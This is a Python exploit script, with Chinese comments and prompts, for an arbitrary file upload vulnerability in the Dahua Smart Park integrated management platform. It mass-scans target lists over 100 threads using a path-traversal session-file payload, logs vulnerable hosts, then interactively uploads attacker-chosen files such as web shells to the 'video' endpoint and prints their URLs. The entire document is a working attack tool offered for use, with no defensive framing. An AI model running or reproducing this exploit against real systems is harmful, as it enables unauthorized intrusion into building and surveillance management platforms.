#大华智慧园区综合管理平台video任意文件上传漏洞

import argparse,requests,sys,time,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m' #输出颜色
RESET = '\033[0m'

def banner():
    text = '''

 
███████╗██╗██╗     ███████╗    ██╗   ██╗██████╗ ██╗      █████╗  ██████╗ ██████╗ 
██╔════╝██║██║     ██╔════╝    ██║   ██║██╔══██╗██║     ██╔══██╗██╔═══██╗██╔══██╗
█████╗  ██║██║     █████╗      ██║   ██║██████╔╝██║     ███████║██║   ██║██║  ██║
██╔══╝  ██║██║     ██╔══╝      ██║   ██║██╔═══╝ ██║     ██╔══██║██║   ██║██║  ██║
██║     ██║███████╗███████╗    ╚██████╔╝██║     ███████╗██║  ██║╚██████╔╝██████╔╝
╚═╝     ╚═╝╚══════╝╚══════╝     ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝                                                ░                                ░        
                                                                version:DH_video_fileupload 1.0
'''
    print(text)
def main():
    banner()
    #设置参数
    parser = argparse.ArgumentParser(description="大华智慧园区综合管理平台video任意文件上传漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help="input your url")
    parser.add_argument('-f','--file',dest='file',type=str,help='input file path')
    args = parser.parse_args()
    #处理资产，添加线程
    if args.url and not args.file:
        # poc(args.url)
        if poc(args.url):
            exp(args.url)
    elif not args.url and args.file:
        url_list = []
        with open('url.txt','r',encoding='utf-8')as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h") 

def poc(target):
    url_payload = '/api/v1/device/bugsInfo'
    url = target + url_payload
    # print(url)
    headers = {'Content-Type': 'multipart/form-data; boundary=1d52ba2a11ad8a915eddab1a0e85acd9'}
    files = {
    'file': ('sess_82c13f359d0dd8f51c29d658a9c8ac71', 'lang|s:52:"../../../../../../../../../../../../../../../../tmp/";')
}
    # files = {
    #     "Filedata":("Test.jsp","Test"),
    #     "Submit":(None,"submit")
    # }
    proxies = {
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
}

    try:
        response = requests.post(url=url,headers=headers,files=files,proxies=proxies,timeout=5)
        if response.status_code == 200 and "success" in response.text:
            print( f"[*] {target} 存在文件上传漏洞！")
            with open('result.txt','a',encoding='utf-8')as f:
                f.write(target + '\n')
                return True
        else:
            print(f"[-] 不存在漏洞！{target}")
            return False
    except Exception:
        print(f"[+]该站点存在问题!{target}")
        return False

def exp(target):
    print("--------------正在进行漏洞利用------------")
    time.sleep(2)

    while True:
        filename = input('请输入要上传的文件名>')
        code = input('请输入文件的内容：',)
        if filename == 'q' or code == 'q':
            print("正在退出,请等候……")
            break
        #给文件设置变量
        url_payload = '/publishing/publishing/material/file/video'
        url = target + url_payload
        headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15", "Content-Type": "multipart/form-data; boundary=dd8f988919484abab3816881c55272a7", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
        data = f"--dd8f988919484abab3816881c55272a7\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"{filename}\"\r\n\r\n{code}\r\n--dd8f988919484abab3816881c55272a7\r\nContent-Disposition: form-data; name=\"Submit\"\r\n\r\nsubmit\r\n--dd8f988919484abab3816881c55272a7--\r\n\r\n\r\n"
        
        res= requests.post(url=url,headers=headers,data=data,timeout=5)
        match1 = re.search('"data":\s*{"id":\d+,"path":"([^"]+)"',res.text)
        result1 = target + '/publishingImg/'+ match1.group(1)
        # print(response.text)
        #判断是否上传成功
        if res.status_code == 200 and "success" in res.text:
            print( f"{GREEN}[+] 上传成功！请访问：{result1} {RESET}")
        else:
            print("不存在！") 

        
if __name__ == '__main__':
    main()
